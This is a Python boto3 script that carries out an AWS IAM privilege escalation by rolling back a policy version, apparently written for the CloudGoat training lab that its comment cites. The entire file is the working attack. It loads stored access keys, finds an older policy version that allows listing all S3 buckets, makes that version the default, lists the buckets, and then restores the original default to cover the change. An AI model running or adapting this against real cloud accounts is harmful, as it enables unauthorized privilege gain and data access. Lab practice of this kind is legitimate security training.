import boto3
import json

# This script will list all the S3 buckets in the account using the IAM user credentials 
# exploiting the AWS IAM user policy version rollback vulnerability
# https://resources.infosecinstitute.com/topic/cloudgoat-walkthrough-series-iam-privilege-escalation-by-rollback/

# Load AWS credentials from .secure/credentials.json
with open('.secure/credentials.json', 'r') as file:
    credentials = json.load(file)

access_key_id=credentials['scenario1']['aws_access_key_id']
secret_access_key=credentials['scenario1']['aws_secret_access_key']
region=credentials['scenario1']['region']
iamuser=credentials['scenario1']['iamuser']

iam = boto3.client(
    'iam',
    aws_access_key_id=access_key_id,
    aws_secret_access_key=secret_access_key
)

response = iam.list_attached_user_policies( UserName=iamuser)

# Obtain the policy arn of the first policy attached to the user
PolicyArn = response['AttachedPolicies'][0]['PolicyArn']
print ('INFO:Vulnerable policy detected PolicyArn:', PolicyArn)
response = iam.list_policy_versions( PolicyArn=PolicyArn)

VersionDefaultId = ''
VersionFound = False
Version2Enable = ''

for Version in response['Versions']:
    if Version['IsDefaultVersion'] == True:
        VersionDefaultId = Version['VersionId']
        print('INFO:Version', VersionDefaultId ,'is detected as the default version of the policy', PolicyArn)
    for Statement in iam.get_policy_version(PolicyArn=PolicyArn, VersionId=Version['VersionId'])['PolicyVersion']['Document']['Statement']:
        if Statement['Action'] == 's3:ListAllMyBuckets' and Statement['Resource'] == '*' and Statement['Effect'] == 'Allow':
            VersionFound=True
            Version2Enable=Version['VersionId']
            print('SUCCESS: Version', Version2Enable ,'is detected as the PRIVILIGED version of the policy', PolicyArn)
            
if VersionFound == True:
     iam.set_default_policy_version(PolicyArn=PolicyArn, VersionId=Version2Enable)
     print('==========>Version', Version2Enable ,'is temporarily established as default version')
     print ('<==========List of S3 buckets:')

     s3 = boto3.client(
        's3',
        aws_access_key_id=access_key_id,
        aws_secret_access_key=secret_access_key)
     for bucketname in s3.list_buckets()['Buckets']:
         print(bucketname['Name'])

     print('==========>Version', VersionDefaultId ,'is restored back as default.')
     iam.set_default_policy_version(PolicyArn=PolicyArn, VersionId=VersionDefaultId)

else:
    print('No Version found with the correct permissions')
